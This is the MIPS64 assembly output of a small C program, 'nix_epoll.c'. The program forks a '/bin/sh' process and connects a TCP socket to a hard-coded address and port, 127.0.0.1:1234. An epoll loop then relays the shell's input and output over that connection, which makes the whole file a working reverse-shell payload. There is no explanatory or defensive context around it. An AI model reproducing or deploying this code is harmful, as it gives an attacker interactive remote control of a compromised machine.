	.file	1 "nix_epoll.c"
	.section .mdebug.abi64
	.previous
	.nan	legacy
	.module	fp=64
	.module	oddspreg
	.abicalls
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align	3
.LC0:
	.ascii	"/bin/sh\000"
	.section	.text.startup,"ax",@progbits
	.align	2
	.globl	main
	.set	nomips16
	.set	nomicromips
	.ent	main
	.type	main, @function
main:
	.frame	$sp,8352,$31		# vars= 8288, regs= 8/0, args= 0, gp= 0
	.mask	0x903f0000,-8
	.fmask	0x00000000,0
	.set	noreorder
	.set	nomacro
	daddiu	$sp,$sp,-8352
	sd	$28,8336($sp)
	lui	$28,%hi(%neg(%gp_rel(main)))
	daddu	$28,$28,$25
	daddiu	$28,$28,%lo(%neg(%gp_rel(main)))
	ld	$25,%call16(pipe)($28)
	daddiu	$4,$sp,8272
	li	$2,16777216			# 0x1000000
	sd	$31,8344($sp)
	daddiu	$2,$2,127
	sd	$21,8328($sp)
	sd	$20,8320($sp)
	sd	$19,8312($sp)
	sd	$18,8304($sp)
	sd	$17,8296($sp)
	sd	$16,8288($sp)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	sd	$2,8280($sp)

	ld	$25,%call16(pipe)($28)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	daddiu	$4,$sp,8264

	ld	$25,%call16(fork)($28)
	.reloc	1f,R_MIPS_JALR,fork
1:	jalr	$25
	nop

	bne	$2,$0,.L2
	lw	$4,8272($sp)

	ld	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$5,$0

	lw	$4,8268($sp)
	ld	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	li	$5,1			# 0x1

	lw	$4,8268($sp)
	ld	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	li	$5,2			# 0x2

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8272($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8276($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8264($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8268($sp)

	ld	$4,%got_page(.LC0)($28)
	ld	$25,%call16(execve)($28)
	daddiu	$4,$4,%got_ofst(.LC0)
	move	$6,$0
	daddiu	$5,$sp,8224
	sd	$4,8224($sp)
	.reloc	1f,R_MIPS_JALR,execve
1:	jalr	$25
	sd	$0,8232($sp)

.L14:
	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8276($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8264($sp)

	ld	$31,8344($sp)
	ld	$28,8336($sp)
	ld	$21,8328($sp)
	ld	$20,8320($sp)
	ld	$19,8312($sp)
	ld	$18,8304($sp)
	ld	$17,8296($sp)
	ld	$16,8288($sp)
	move	$2,$0
	jr	$31
	daddiu	$sp,$sp,8352

.L2:
	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$19,$2

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8268($sp)

	ld	$25,%call16(socket)($28)
	move	$6,$0
	li	$5,2			# 0x2
	.reloc	1f,R_MIPS_JALR,socket
1:	jalr	$25
	li	$4,2			# 0x2

	ld	$25,%call16(connect)($28)
	move	$16,$2
	li	$2,2			# 0x2
	sh	$2,8240($sp)
	li	$2,-11772			# 0xffffffffffffd204
	sh	$2,8242($sp)
	lw	$2,8280($sp)
	li	$6,16			# 0x10
	sw	$2,8244($sp)
	lw	$2,8284($sp)
	daddiu	$5,$sp,8240
	move	$4,$16
	.reloc	1f,R_MIPS_JALR,connect
1:	jalr	$25
	sw	$2,8248($sp)

	ld	$25,%call16(epoll_create1)($28)
	.reloc	1f,R_MIPS_JALR,epoll_create1
1:	jalr	$25
	move	$4,$0

	blez	$2,.L4
	move	$17,$2

	daddiu	$20,$sp,8208
	ld	$25,%call16(epoll_ctl)($28)
	lw	$18,8264($sp)
	move	$7,$20
	move	$6,$16
	li	$5,1			# 0x1
	move	$4,$2
	li	$21,1			# 0x1
	sw	$18,8260($sp)
	sw	$16,8256($sp)
	sw	$16,8216($sp)
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	sw	$21,8208($sp)

	ld	$25,%call16(epoll_ctl)($28)
	move	$7,$20
	move	$6,$18
	li	$5,1			# 0x1
	move	$4,$17
	sw	$18,8216($sp)
	move	$20,$16
	daddiu	$18,$sp,8192
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	sw	$21,8208($sp)

	ld	$25,%call16(epoll_wait)($28)
.L15:
	li	$7,-1			# 0xffffffffffffffff
	li	$6,1			# 0x1
	move	$5,$18
	.reloc	1f,R_MIPS_JALR,epoll_wait
1:	jalr	$25
	move	$4,$17

	blez	$2,.L5
	lw	$2,8192($sp)

	andi	$3,$2,0x18
	bne	$3,$0,.L5
	andi	$2,$2,0x1

	beq	$2,$0,.L5
	lw	$2,8200($sp)

	ld	$25,%call16(read)($28)
	li	$6,8192			# 0x2000
	bne	$2,$20,.L6
	move	$5,$sp

	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	move	$4,$16

	lw	$4,8276($sp)
	sll	$6,$2,0
	move	$5,$sp
.L13:
	ld	$25,%call16(write)($28)
	.reloc	1f,R_MIPS_JALR,write
1:	jalr	$25
	nop

	b	.L15
	ld	$25,%call16(epoll_wait)($28)

.L6:
	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	lw	$4,8264($sp)

	move	$5,$sp
	sll	$6,$2,0
	b	.L13
	move	$4,$16

.L5:
	ld	$25,%call16(epoll_ctl)($28)
	lw	$6,8256($sp)
	move	$7,$0
	li	$5,2			# 0x2
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	move	$4,$17

	lw	$6,8260($sp)
	ld	$25,%call16(epoll_ctl)($28)
	move	$7,$0
	li	$5,2			# 0x2
	.reloc	1f,R_MIPS_JALR,epoll_ctl
1:	jalr	$25
	move	$4,$17

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$4,$17

.L4:
	ld	$25,%call16(kill)($28)
	move	$4,$19
	.reloc	1f,R_MIPS_JALR,kill
1:	jalr	$25
	li	$5,18			# 0x12

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$4,$16

	b	.L14
	nop

	.set	macro
	.set	reorder
	.end	main
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-18) 6.3.0 20170516"
